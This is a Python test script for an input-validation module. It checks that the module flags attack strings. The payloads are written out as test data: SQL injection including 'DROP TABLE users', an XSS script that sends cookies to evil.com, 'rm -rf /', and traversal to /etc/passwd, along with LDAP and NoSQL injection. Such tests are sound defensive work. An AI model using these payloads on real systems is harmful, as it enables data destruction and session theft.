#!/usr/bin/env python3
"""
Simple test script to demonstrate the Input Validation module
"""

import sys
import os

# Add src directory to path
sys.path.append(os.path.join(os.path.dirname(__file__), 'src'))

from core.validator import InputValidator, ValidationResult

def test_basic_validation():
    """Test basic validation functionality"""
    print("🧪 Testing Basic Validation...")
    
    validator = InputValidator()
    
    # Test email validation
    result = validator.validate_field("test@example.com", "email")
    print(f"✅ Email validation: {result.is_valid}")
    
    # Test invalid email
    result = validator.validate_field("invalid-email", "email")
    print(f"❌ Invalid email validation: {result.is_valid} - {result.errors}")
    
    # Test integer validation
    result = validator.validate_field("42", "integer", min_value=0, max_value=100)
    print(f"✅ Integer validation: {result.is_valid}")
    
    # Test invalid integer
    result = validator.validate_field("999", "integer", min_value=0, max_value=100)
    print(f"❌ Invalid integer validation: {result.is_valid} - {result.errors}")

def test_security_validation():
    """Test security validation functionality"""
    print("\n🔒 Testing Security Validation...")
    
    validator = InputValidator()
    
    # Test SQL injection detection
    sql_payload = "'; DROP TABLE users; --"
    result = validator.validate_field(sql_payload, "string", sql_safe=True)
    print(f"🚨 SQL injection detection: {result.is_valid} - {result.errors}")
    
    # Test XSS detection
    xss_payload = "<script>alert('xss')</script>"
    result = validator.validate_field(xss_payload, "string", xss_safe=True)
    print(f"🚨 XSS detection: {result.is_valid} - {result.errors}")
    
    # Test command injection detection
    cmd_payload = "user_input; rm -rf /"
    result = validator.validate_field(cmd_payload, "string", command_safe=True)
    print(f"🚨 Command injection detection: {result.is_valid} - {result.errors}")
    
    # Test path traversal detection
    path_payload = "../../../etc/passwd"
    result = validator.validate_field(path_payload, "string", path_safe=True)
    print(f"🚨 Path traversal detection: {result.is_valid} - {result.errors}")

def test_schema_validation():
    """Test schema validation functionality"""
    print("\n📋 Testing Schema Validation...")
    
    validator = InputValidator()
    
    # Define a user schema
    user_schema = {
        "username": {
            "type": "string",
            "required": True,
            "min_length": 3,
            "max_length": 30,
            "sql_safe": True,
            "xss_safe": True
        },
        "email": {
            "type": "email",
            "required": True,
            "sql_safe": True,
            "xss_safe": True
        },
        "age": {
            "type": "integer",
            "required": True,
            "min_value": 13,
            "max_value": 120
        }
    }
    
    # Test valid user data
    valid_user = {
        "username": "john_doe",
        "email": "john@example.com",
        "age": 25
    }
    
    result = validator.validate_schema(valid_user, user_schema)
    print(f"✅ Valid user schema: {result.is_valid}")
    
    # Test invalid user data
    invalid_user = {
        "username": "j",  # Too short
        "email": "invalid-email",  # Invalid email
        "age": 150  # Too old
    }
    
    result = validator.validate_schema(invalid_user, user_schema)
    print(f"❌ Invalid user schema: {result.is_valid}")
    for error in result.errors:
        print(f"   - {error}")

def test_security_threats():
    """Test various security threats"""
    print("\n🚨 Testing Security Threats...")
    
    validator = InputValidator()
    
    # Test various attack payloads
    threats = [
        ("SQL Injection", "'; SELECT * FROM users WHERE id = 1 OR '1'='1"),
        ("XSS Attack", "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"),
        ("Command Injection", "user_input && cat /etc/passwd"),
        ("Path Traversal", "....//....//....//etc/passwd"),
        ("LDAP Injection", "*)(uid=*))(|(uid=*"),
        ("NoSQL Injection", '{"$where": "function() { return true }"}'),
    ]
    
    for threat_name, payload in threats:
        # Test with all security flags enabled
        result = validator.validate_field(
            payload, 
            "string", 
            sql_safe=True, 
            xss_safe=True, 
            command_safe=True, 
            path_safe=True
        )
        
        if result.is_valid:
            print(f"⚠️  {threat_name}: NOT DETECTED")
        else:
            print(f"✅ {threat_name}: DETECTED - {result.errors[0] if result.errors else 'Unknown error'}")

def main():
    """Run all tests"""
    print("🚀 Input Validation Module - Test Suite")
    print("=" * 50)
    
    try:
        test_basic_validation()
        test_security_validation()
        test_schema_validation()
        test_security_threats()
        
        print("\n🎉 All tests completed successfully!")
        
    except Exception as e:
        print(f"\n❌ Test failed with error: {e}")
        import traceback
        traceback.print_exc()
        return 1
    
    return 0

if __name__ == "__main__":
    sys.exit(main()) 